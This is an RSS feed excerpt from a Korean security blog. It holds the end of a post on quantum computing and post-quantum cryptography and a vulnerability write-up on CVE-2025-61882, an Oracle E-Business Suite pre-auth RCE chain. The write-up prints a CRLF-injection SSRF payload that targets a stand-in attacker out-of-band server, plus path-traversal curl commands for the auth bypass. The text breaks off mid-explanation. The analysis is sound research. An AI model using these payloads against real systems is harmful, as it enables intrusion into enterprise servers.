&#xC9C0;&#xAE08;&#xC758; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xB294; &#xB300;&#xBD80;&#xBD84; &#xC218;&#xBC31; &#xAC1C; &#xC218;&#xC900;&#xC758; &#xBB3C;&#xB9AC; &#xD050;&#xBE44;&#xD2B8;(physical qubit)&#xB2E8;&#xACC4;&#xC5D0; &#xBA38;&#xBB3C;&#xB7EC; &#xC788;&#xAC70;&#xB4E0;&#xC694;.</p><p>&#xAC8C;&#xB2E4;&#xAC00; &#xBB3C;&#xB9AC; &#xD050;&#xBE44;&#xD2B8;&#xB97C; &#xC5EC;&#xB7EC; &#xAC1C; &#xBB36;&#xC5B4;&#xC11C; &#xD558;&#xB098;&#xC758; &#xB17C;&#xB9AC; &#xD050;&#xBE44;&#xD2B8;&#xB97C; &#xB9CC;&#xB4DC;&#xB294; &#xC624;&#xB958; &#xBCF4;&#xC815;(error correction) &#xAE30;&#xC220;&#xB3C4; &#xC544;&#xC9C1; &#xC5F0;&#xAD6C; &#xB2E8;&#xACC4;&#xC5D0; &#xBA38;&#xBB3C;&#xB7EC; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xC9C0;&#xAE08;&#xC740; &#xC591;&#xC790; &#xCEF4;&#xD4E8;&#xD130;&#xB97C; &#xC548;&#xC815;&#xC801;&#xC73C;&#xB85C; &#xC791;&#xB3D9; &#xC2DC;&#xD0A4;&#xB294; &#xBC95;&#xC744; &#xBC30;&#xC6B0;&#xB294; &#xC2DC;&#xB300;&#xB77C;&#xACE0; &#xBCFC; &#xC218; &#xC788;&#xC5B4;&#xC694;.</p><p>&#xADF8;&#xB7FC;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0; Q-Day&#xAC00; <strong>&#xC5B8;&#xC820;&#xAC00; &#xBC18;&#xB4DC;&#xC2DC; &#xC628;&#xB2E4;</strong>&#xB294; &#xC810;&#xC5D0;&#xB294; &#xC774;&#xACAC;&#xC774; &#xC5C6;&#xC5B4;&#xC694;. &#xC774;&#xBBF8; &#xC815;&#xBD80;&#xC640; &#xC8FC;&#xC694; &#xAE30;&#xAD00;&#xB4E4;&#xC740; &#xADF8; &#xC2DC;&#xC810;&#xC744; &#xB300;&#xBE44;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC6C0;&#xC9C1;&#xC784;&#xC744; &#xC2DC;&#xC791;&#xD588;&#xAC70;&#xB4E0;&#xC694;. &#xBBF8;&#xAD6D; NIST(&#xAD6D;&#xB9BD;&#xD45C;&#xC900;&#xAE30;&#xC220;&#xC5F0;&#xAD6C;&#xC18C;)&#xB294; <strong>&#xC591;&#xC790; &#xB0B4;&#xC131; &#xC554;&#xD638;(Post-Quantum Cryptography, PQC)</strong> &#xD45C;&#xC900;&#xD654;&#xB97C; &#xCD94;&#xC9C4;&#xD558;&#xACE0;, 2024&#xB144;&#xC5D0; 1&#xCC28; &#xD45C;&#xC900; &#xD6C4;&#xBCF4;&#xAD70;&#xC744; &#xD655;&#xC815;&#xD588;&#xC5B4;&#xC694;. &#xC720;&#xB7FD;&#xC5F0;&#xD569;&#xACFC; &#xD55C;&#xAD6D;&#xC758; KISA, &#xC77C;&#xBCF8;&#xC758; NICT &#xB4F1;&#xB3C4; &#xC774;&#xC5D0; &#xB300;&#xBE44;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/10/12/bekim/quantum_computer/ko/image4.png" alt></p><blockquote><p>Source: IMARC Group</p></blockquote><p>&#xC774;&#xCC98;&#xB7FC; &#xAC01;&#xAD6D; &#xC815;&#xBD80;&#xC640; &#xAE30;&#xC5C5;&#xC774; &#xC591;&#xC790; &#xC704;&#xD611;&#xC5D0; &#xB300;&#xBE44;&#xD558;&#xBA74;&#xC11C;, &#xC591;&#xC790; &#xB0B4;&#xC131; &#xC554;&#xD638;<strong>(PQC)</strong>&#xC2DC;&#xC7A5;&#xB3C4; &#xD3ED;&#xBC1C;&#xC801;&#xC73C;&#xB85C; &#xC131;&#xC7A5;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. IMARC Group&#xC5D0; &#xB530;&#xB974;&#xBA74; PQC &#xC2DC;&#xC7A5;&#xC740; 2024&#xB144; &#xC57D; 3&#xC5B5; &#xB2EC;&#xB7EC; &#xADDC;&#xBAA8;&#xC5D0;&#xC11C; 2033&#xB144;&#xC5D0;&#xB294; &#xC57D; 94&#xC5B5; &#xB2EC;&#xB7EC;&#xAE4C;&#xC9C0; &#xC131;&#xC7A5;&#xD560; &#xAC83;&#xC73C;&#xB85C; &#xC608;&#xCE21;&#xB3FC;&#xC694;. </p><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xCD5C;&#xB300;&#xD55C; &#xC27D;&#xAC8C;, &#xC591;&#xC790;&#xCEF4;&#xD4E8;&#xD130;&#xC640; &#xC554;&#xD638;&#xC758; &#xAD00;&#xACC4;&#xB97C; &#xC815;&#xB9AC;&#xD574;&#xBD24;&#xC5B4;&#xC694;. &#xAE30;&#xD68C;&#xAC00; &#xB41C;&#xB2E4;&#xBA74; &#xC591;&#xC790; &#xB0B4;&#xC131; &#xC554;&#xD638;(PQC)&#xC5D0; &#xBB50;&#xAC00; &#xC788;&#xB294;&#xC9C0;, &#xC65C; &#x201C;&#xD3EC;&#xC2A4;&#xD2B8; &#xC591;&#xC790; &#xC2DC;&#xB300;&#x201D;&#xC758; &#xD575;&#xC2EC; &#xAE30;&#xC220;&#xB85C; &#xBD88;&#xB9AC;&#xB294;&#xC9C0; &#xD568;&#xAED8; &#xC54C;&#xC544;&#xBCFC;&#xAC8C;&#xC694;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/crypto/">crypto</category>
      
      <category domain="https://hackyboiz.github.io/tags/quantum/">quantum</category>
      
      <category domain="https://hackyboiz.github.io/tags/quantumcomputing/">quantumcomputing</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/12/bekim/quantum_computer/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-61882: Oracle E-Business Suite에서 발생한 연쇄 취약점으로 인한 RCE (CRLF Injection 등)</title>
      <link>https://hackyboiz.github.io/2025/10/11/banda/CVE-2025-61882/</link>
      <guid>https://hackyboiz.github.io/2025/10/11/banda/CVE-2025-61882/</guid>
      <pubDate>Sat, 11 Oct 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.oracle.com/security-alerts/alert-cve-20</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.oracle.com/security-alerts/alert-cve-2025-61882.html">https://www.oracle.com/security-alerts/alert-cve-2025-61882.html</a></li><li><a href="https://labs.watchtowr.com/well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882/">https://labs.watchtowr.com/well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882well-well-well-its-another-day-oracle-e-business-suite-pre-auth-rce-chain-cve-2025-61882/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Oracle E-Business Suite 12.2.3-12.2.14</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-61882&#xB294; Oracle E-Business Suite(EBS)&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC73C;&#xBA70;, &#xB2E8;&#xC77C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC544;&#xB2CC; &#xC5F0;&#xC1C4; &#xCDE8;&#xC57D;&#xC810; &#xAE30;&#xBC18; Pre-Auth RCE Chain&#xC785;&#xB2C8;&#xB2E4;. Oracle EBS&#xB294; &#xAE30;&#xC5C5;&#xC6A9; &#xD1B5;&#xD569; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xBAA8;&#xC74C; &#xC11C;&#xBE44;&#xC2A4;&#xB85C; &#xC601;&#xD5A5; &#xBC94;&#xC704;&#xAC00; &#xD06C;&#xBA70;, &#xACF5;&#xACA9;&#xC5D0;&#xB294; &#xB2E4;&#xC74C; &#xAE30;&#xBC95;&#xACFC; &#xD750;&#xB984;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>URL-encoded XML injection &#x2192; SSRF</li><li>CRLF injection</li><li>Auth bypass</li><li>HTTP request smuggling(keep-alive smuggling)</li><li>OOB XSL / XSLT &#xB85C;&#xB4DC;</li><li>XSLT Java &#xD655;&#xC7A5; / ScriptEngine &#xC545;&#xC6A9;</li></ul><h3 id="1-URL-encoded-XML-&#x2192;-Server-Side-Request-Forgery-SSRF"><a href="#1-URL-encoded-XML-&#x2192;-Server-Side-Request-Forgery-SSRF" class="headerlink" title="1. URL-encoded XML &#x2192; Server-Side Request Forgery (SSRF)"></a>1. URL-encoded XML &#x2192; Server-Side Request Forgery (SSRF)</h3><pre><code class="hljs java"><span class="hljs-keyword">if</span> (paramHttpServletRequest.getParameter(<span class="hljs-string">&quot;getUiType&quot;</span>) != <span class="hljs-keyword">null</span>) {  String str = paramHttpServletRequest.getParameter(<span class="hljs-string">&quot;redirectFromJsp&quot;</span>); <span class="hljs-comment">// [1]</span>  XMLDocument xMLDocument = XmlUtil.parseXmlString(paramHttpServletRequest.getParameter(<span class="hljs-string">&quot;getUiType&quot;</span>)); <span class="hljs-comment">// [0]</span>  <span class="hljs-keyword">if</span> (str == <span class="hljs-keyword">null</span> || <span class="hljs-string">&quot;false&quot;</span>.equalsIgnoreCase(str)) {    redirectToCZInitialize(...);    <span class="hljs-keyword">return</span>;  }  createNew(xMLDocument, httpSession, paramHttpServletRequest, paramHttpServletResponse); <span class="hljs-comment">// [2]</span>}</code></pre><p>&#xBA3C;&#xC800; &#xCCAB; &#xBC88;&#xC9F8; &#xCDE8;&#xC57D;&#xC131;&#xC740; URL-encoded XML &#xC785;&#xB825; &#xC8FC;&#xC785;&#xC744; &#xD1B5;&#xD574; SSRF&#xAC00; &#xBC1C;&#xC0DD;&#xD55C;&#xB2E4;&#xB294; &#xC810;&#xC774;&#xBA70;, &#xC774;&#xB294; servlet &#xC9C4;&#xC785;&#xBD80;&#xC758; &#xB85C;&#xC9C1;&#xC5D0;&#xC11C; &#xBE44;&#xB86F;&#xB429;&#xB2C8;&#xB2E4;.</p><ul><li><code>[0]</code>: <code>getUiType</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xC5D0;&#xC11C; XML &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC9C1;&#xC811; &#xD30C;&#xC2F1;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>[1]</code>: <code>redirectFromJsp</code>&#xAC00; null&#xC774; &#xC544;&#xB2D0; &#xB54C; <code>createNew()</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</li><li><code>[2]</code>: <code>createNew()</code>&#xAC00; &#xC774;&#xD6C4; XML &#xB0B4;&#xC6A9;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; <code>return_url</code>&#xC744; &#xCD94;&#xCD9C;&#xD574; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</li></ul><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">postXmlMessage</span><span class="hljs-params">(String paramString1, String paramString2)</span> <span class="hljs-keyword">throws</span> ServletException </span>{  URL uRL = getUrl(paramString1);  <span class="hljs-keyword">if</span> (uRL != <span class="hljs-keyword">null</span>)    paramString1 = uRL.toExternalForm();  CZURLConnection cZURLConnection = <span class="hljs-keyword">new</span> CZURLConnection(paramString1);  String[] arrayOfString1 = { <span class="hljs-string">&quot;XMLmsg&quot;</span> };  String[] arrayOfString2 = { paramString2 };  cZURLConnection.connect(<span class="hljs-number">1</span>, arrayOfString1, arrayOfString2);  cZURLConnection.close();}</code></pre><p><code>postXmlMessage()</code>&#xB294; <code>return_url</code>&#xB85C; <code>CZURLConnection</code>&#xC744; &#xB9CC;&#xB4E0; &#xB4A4; <code>cZURLConnection.connect(...)</code>&#xC5D0;&#xC11C; <code>URL.openConnection()</code>&#x2192;<code>HttpURLConnection</code>&#xC744; &#xC124;&#xC815;&#xD558;&#xACE0; <code>getOutputStream()</code> &#xB2E8;&#xACC4;&#xC5D0;&#xC11C; &#xC2E4;&#xC81C; TCP &#xC5F0;&#xACB0;&#xC744; &#xB9FA;&#xC5B4; POST&#xB97C; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; &#xAC80;&#xC99D;&#xB418;&#xC9C0; &#xC54A;&#xC740; <code>return_url</code> &#xC774; &#xACF5;&#xACA9;&#xC790; &#xC81C;&#xC5B4; &#xC8FC;&#xC18C;&#xB77C;&#xBA74;, &#xC11C;&#xBC84;&#xAC00; &#xADF8; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC9C1;&#xC811; &#xC544;&#xC6C3;&#xBC14;&#xC6B4;&#xB4DC; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xAC8C; &#xB418;&#xC5B4; SSRF&#xAC00; &#xC131;&#xB9BD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">connect</span><span class="hljs-params">(URL paramURL, String paramString)</span> <span class="hljs-keyword">throws</span> IOException </span>{  HttpURLConnection httpURLConnection = (HttpURLConnection)paramURL.openConnection();  updateDefaultHeaders(httpURLConnection, ...);  httpURLConnection.setDoOutput(<span class="hljs-keyword">true</span>);  httpURLConnection.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);  <span class="hljs-keyword">this</span>.m_connectionOutputStream = httpURLConnection.getOutputStream();  postMessage(paramString, httpURLConnection);}</code></pre><p>&#xB610;&#xD55C; <code>connect()</code> &#xD568;&#xC218;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; <code>openConnection()</code>&#xC5D0;&#xC11C; &#xC0DD;&#xC131;&#xB41C; &#xC5F0;&#xACB0;&#xC774; &#xAC80;&#xC99D;&#xC5C6;&#xC774; &#xACE7;&#xBC14;&#xB85C; POST&#xB97C; &#xC218;&#xD589;&#xD558;&#xBBC0;&#xB85C;, &#xBCC4;&#xB2E4;&#xB978; &#xAC80;&#xC99D;&#xC774; &#xC5C6;&#xB294; &#xC0C1;&#xD0DC;&#xB85C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD638;&#xCD9C;&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB294; &#xBB38;&#xC81C;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="2-CRLF-Injection"><a href="#2-CRLF-Injection" class="headerlink" title="2. CRLF Injection"></a>2. CRLF Injection</h3><p>PoC&#xC5D0; <code>return_url</code>&#xC5D0; &#xD3EC;&#xD568;&#xB418;&#xC5B4; <code>&amp;#13;&amp;#10;</code>, <code>%0d%0a</code>&#xC640; &#xAC19;&#xC740; CRLF&#xAC00; &#xB514;&#xCF54;&#xB4DC;&#xB418;&#xC5B4; &#xC2E4;&#xC81C; &#xBC14;&#xC774;&#xD2B8;&#xB85C; &#xC18C;&#xCF13;&#xC5D0; &#xC4F0;&#xC774;&#xBA74;, &#xC11C;&#xBC84;&#xAC00; &#xC804;&#xC1A1;&#xD558;&#xB294; HTTP &#xC694;&#xCCAD;&#xC758; &#xB77C;&#xC778;/&#xD5E4;&#xB354; &#xACBD;&#xACC4;&#xB97C; &#xC870;&#xC791;&#xD574; &#xC784;&#xC758;&#xC758; &#xD5E4;&#xB354; &#xBE14;&#xB85D;&#xC774;&#xB098; &#xCD94;&#xAC00; &#xC694;&#xCCAD; &#xB77C;&#xC778;&#xC744; &#xC0BD;&#xC785;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs html">redirectFromJsp=1&amp;getUiType=<span class="hljs-tag">&lt;<span class="hljs-name">@urlencode</span>&gt;</span><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">initialize</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;init_was_saved&quot;</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;return_url&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">http:</span>//<span class="hljs-attr">attacker-oob-server</span>&gt;</span><span class="hljs-symbol">&amp;#47;</span>HeaderInjectionTest<span class="hljs-symbol">&amp;#32;</span>HTTP<span class="hljs-symbol">&amp;#47;</span>1<span class="hljs-symbol">&amp;#46;</span>1<span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#10;</span>InjectedHeader<span class="hljs-symbol">&amp;#58;</span>Injected<span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#10;</span><span class="hljs-symbol">&amp;#32;</span><span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#10;</span><span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#10;</span><span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#10;</span><span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#13;</span><span class="hljs-symbol">&amp;#10;</span>POST<span class="hljs-symbol">&amp;#32;</span><span class="hljs-symbol">&amp;#47;</span><span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ui_def_id&quot;</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;config_effective_usage_id&quot;</span>&gt;</span>0<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ui_type&quot;</span>&gt;</span>Applet<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">initialize</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">@urlencode</span>&gt;</span></code></pre><p>&#xC989;, SSRF&#xB97C; &#xD1B5;&#xD574; &#xC694;&#xCCAD; &#xBC14;&#xB514;&#xC758; <code>getUiType</code>&#xC5D0; URL-encoded XML&#xC744; &#xBCF4;&#xB0B4;&#xACE0;, &#xADF8; &#xC548;&#xC758; <code>return_url</code>&#xC5D0; <code>\r\n</code>(CRLF)&#xACFC; <code>POST /</code>&#xC640; &#xAC19;&#xC740; &#xCD94;&#xAC00; &#xD5E4;&#xB354; &#xB77C;&#xC778;&#xC744; &#xB07C;&#xC6CC; &#xB123;&#xC73C;&#xBA74;, &#xC218;&#xC2E0; &#xCE21;&#xC5D0;&#xC11C;&#xB294; &#xC544;&#xB798;&#xCC98;&#xB7FC; **&#xC8FC;&#xC785;&#xB41C; &#xC694;&#xCCAD; &#xB77C;&#xC778;/&#xD5E4;&#xB354;&#xAC00; &#xAD00;&#xCC30;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs xml">POST /HeaderInjectionTest HTTP/1.1--- HEADERS ---InjectedHeader: Injected</code></pre><h3 id="3-HTTP-persistent-connection-keep-alive"><a href="#3-HTTP-persistent-connection-keep-alive" class="headerlink" title="3. HTTP persistent connection(keep-alive)"></a>3. HTTP persistent connection(keep-alive)</h3><p><img src="/2025/10/11/banda/CVE-2025-61882/image1.png" alt></p><p>&#xC774;&#xD6C4; &#xB450; &#xBC88;&#xC9F8; &#xB2E8;&#xACC4;(CRLF injection)&#xB294; &#xC138; &#xBC88;&#xC9F8; &#xB2E8;&#xACC4;&#xC778; HTTP keep-alive &#xC545;&#xC6A9;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p><strong><em>keep-alive</em></strong><br>HTTP/1.1&#xC5D0;&#xC11C; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xB3D9;&#xC791;&#xC73C;&#xB85C;, &#xD558;&#xB098;&#xC758; TCP &#xC5F0;&#xACB0;&#xC744; &#xB2EB;&#xC9C0; &#xC54A;&#xACE0; &#xC5EC;&#xB7EC; &#xC694;&#xCCAD;/&#xC751;&#xB2F5;&#xC744; &#xC5F0;&#xC18D; &#xCC98;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD574; &#xC90D;&#xB2C8;&#xB2E4;. (&#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; <code>Connection: close</code>&#xAC00; &#xC544;&#xB2CC; &#xD55C; &#xC9C0;&#xC18D;)</p></blockquote><p>&#xC989;, SSRF&#xB97C; &#xD1B5;&#xD574; &#xC694;&#xCCAD; &#xACBD;&#xACC4;&#xB97C; &#xC870;&#xC791;&#xD55C; &#xB4A4;, &#xB3D9;&#xC77C;&#xD55C; TCP &#xC5F0;&#xACB0;&#xC744; keep-alive&#xB85C; &#xC7AC;&#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xD6C4;&#xC18D; &#xC694;&#xCCAD;&#xC744; &#xAC19;&#xC740; &#xC5F0;&#xACB0;&#xC5D0;&#xC11C; &#xC5F0;&#xC18D; &#xC804;&#xC1A1;&#xD560; &#xC218; &#xC788;&#xC5B4; &#xD0D0;&#xC9C0; &#xB178;&#xC774;&#xC988;&#xB97C; &#xC904;&#xC774;&#xBA74;&#xC11C; &#xD6C4;&#xC18D; &#xC694;&#xCCAD;&#xC774; <code>localhost:7201</code>&#xACFC; &#xAC19;&#xC740; &#xB0B4;&#xBD80; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xB3C4;&#xB85D; &#xC720;&#xB3C4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="4-Auth-Bypass"><a href="#4-Auth-Bypass" class="headerlink" title="4. Auth Bypass"></a>4. Auth Bypass</h3><pre><code class="hljs xml"># netstat -lnttcp6       0      0 172.31.28.161:7201      :::*                    LISTEN# cat /etc/hosts172.31.28.161   apps.example.com        apps#</code></pre><p>Oracle EBS &#xB0B4;&#xBD80; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xD575;&#xC2EC; HTTP &#xC11C;&#xBE44;&#xC2A4;&#xB294; 172.31.28.161:7201&#xCC98;&#xB7FC; &#xC0AC;&#xC124; IP&#xC5D0; &#xBC14;&#xC778;&#xB529;&#xB418;&#xC5B4; &#xC788;&#xB294; &#xD615;&#xD0DC;&#xC778;&#xB370;, &#xC774;&#xB54C; <code>/etc/hosts</code> &#xD30C;&#xC77C; &#xC548;&#xC5D0; <code>apps.example.com</code> &#xB9E4;&#xD551;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xB54C;&#xBB38;&#xC5D0; &#xC11C;&#xBC84; &#xCE21; &#xAD00;&#xC810;(SSRF/&#xC2A4;&#xBA38;&#xAE00;&#xB9C1;&#xC73C;&#xB85C; &#xC5F4;&#xC5B4;&#xB454; &#xC5F0;&#xACB0;)&#xC5D0;&#xC11C;&#xB294; <code>http://apps.example.com:7201</code> &#xC73C;&#xB85C; &#xB0B4;&#xBD80; &#xC11C;&#xBE44;&#xC2A4;&#xC5D0; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs xml"># curl -s http://apps.example.com:7201/OA_HTML/ieshostedsurvey.jsp# curl -s --path-as-is http://apps.example.com:7201/OA_HTML/help/../ieshostedsurvey.jsp</code></pre><p>&#xB610;&#xD55C; <code>/OA_HTML/help/</code>&#xB294; &#xC778;&#xC99D;&#xC774; &#xC694;&#xAD6C;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xACF5;&#xAC1C; &#xACBD;&#xB85C;&#xC774;&#xBBC0;&#xB85C;, <code>../</code>&#xC640; &#xAC19;&#xC740; &#xACBD;&#xB85C; &#xD6A1;&#xB2E8;&#xC744; &#xCD94;&#xAC00;&#xD574; <code>/OA_HTML/help/../ieshostedsurvey.jsp</code> &#xD615;&#xD0DC;&#xB85C; &#xD654;&#xC774;&#xD2B8;&#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xC6B0;&#xD68C;&#xD574; &#xBCF4;&#xD638;&#xB41C; jsp&#xC778; <code>ieshostedsurvey.jsp</code>&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="5-XSL-Transformation-XSLT"><a href="#5-XSL-Transformation-XSLT" class="headerlink" title="5. XSL Transformation (XSLT)"></a>5. XSL Transformation (XSLT)</h3><pre><code class="hljs java">&lt;html&gt;&lt;head&gt;..&lt;/head&gt;&lt;body &lt;%=_jtfPageContext.getHtmlBodyAttr() %&gt; <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&apos;applicationBody&apos;</span>&gt;..StringBuffer urlbuf = <span class="hljs-keyword">new</span> StringBuffer();urlbuf.append(<span class="hljs-string">&quot;http://&quot;</span>);urlbuf.append(request.getServerName()); <span class="hljs-comment">// [1]</span>urlbuf.append(<span class="hljs-string">&quot;:&quot;</span>).append(request.getServerPort()).append(URI.toString()); <span class="hljs-comment">// [2]</span>String xslURL = urlbuf.toString() + <span class="hljs-string">&quot;ieshostedsurvey.xsl&quot;</span>;URL stylesheetURL = <span class="hljs-keyword">new</span> URL(xslURL.toString()); <span class="hljs-comment">// [3]</span>XSLStylesheet sheet = <span class="hljs-keyword">new</span> XSLStylesheet(stylesheetURL,stylesheetURL); <span class="hljs-comment">// [4]</span>XSLProcessor xslt = <span class="hljs-keyword">new</span> XSLProcessor();xslt.processXSL(sheet, xmlDoc, ...); <span class="hljs-comment">//[5]</span>..&lt;/body&gt;&lt;/html&gt;</code></pre><p>Auth Bypass&#xB85C; &#xC811;&#xADFC;&#xB41C; <code>ieshostedsurvey.jsp</code>&#xC5D0;&#xB294; &#xC2E0;&#xB8B0;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xC785;&#xB825;&#xC73C;&#xB85C; XSL URL&#xC744; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xAD6C;&#xC131;&#xD55C; &#xB2E4;&#xC74C;, &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xC6D0;&#xACA9; XSL&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xACE0; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xB610; &#xB2E4;&#xB978; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li><code>[1]</code>,<code>[2]</code>&#xC5D0;&#xC11C; <code>request.getServerName()</code>, <code>request.getServerPort()</code>&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8;&#xAC00; &#xC870;&#xC791; &#xAC00;&#xB2A5;&#xD55C; Host &#xD5E4;&#xB354;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294;&#xB370;, &#xC774; &#xAC12;&#xC744; &#xC2E0;&#xB8B0;&#xD574; <code>xslURL</code>&#xC744; &#xB9CC;&#xB4E4;&#xBA74; &#xC545;&#xC131; XSL&#xC744; &#xD638;&#xC2A4;&#xD305;&#xD558;&#xB294; &#xC11C;&#xBC84;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</li><li><code>[3]</code>,<code>[4]</code>,<code>[5]</code>&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74;, &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC740; &#xD574;&#xB2F9; &#xC6D0;&#xACA9; XSL&#xC744; &#xC989;&#xC2DC; &#xB85C;&#xB4DC;&#xD558;&#xACE0; XSLT &#xCC98;&#xB9AC;&#xB97C; 